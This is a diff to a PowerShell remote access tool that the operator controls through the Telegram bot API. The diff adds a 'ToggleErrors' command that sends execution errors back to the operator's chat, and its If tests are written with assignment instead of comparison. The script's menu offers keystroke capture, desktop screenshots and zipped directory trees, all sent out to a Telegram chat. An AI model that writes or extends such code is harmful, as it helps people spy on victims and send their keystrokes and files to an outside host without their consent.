@@ -11,6 +11,7 @@ $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
+$errormsg = 0 # 1 = return error messages (off by default)
 
 # Emoji characters
 $tick = [char]::ConvertFromUtf32(0x2705)
@@ -63,6 +64,7 @@ $contents = "==============================================
 ExtraInfo    : Extra commands information
 Close   : Close this Session
 PauseSession   : Kills this session and restarts
+ToggleErrors    : Toggle error messages to chat
 FolderTree    : Gets Dir tree and sends it zipped
 Screenshot   : Sends a screenshot of the desktop
 Keycapture    : Capture Keystrokes and send
@@ -120,6 +122,7 @@ into the chat (before invoking the function!)
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
+
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
@@ -519,6 +522,24 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     }
 }
 
+Function ToggleErrors{
+
+If($errormsg = 0){
+    $errormsg = 1
+    $contents = "$tick Error Messaging ON $tick"
+    $params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    }
+If($errormsg = 1){
+    $errormsg = 0
+    $contents = "$closed Error Messaging OFF $closed"
+    $params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    }
+
+}
+
+
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
 Function IsAuth{ 
@@ -579,7 +600,11 @@ $messages=rtgmsg
                 else{
                 stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
                 }
-                }catch {<# stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id #> }
+                }catch {
+                    if($errormsg -eq 1){
+                    stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id
+                    }
+                }
             Finally{$lastexecMessageID=$messages.message.date}
         }
     }
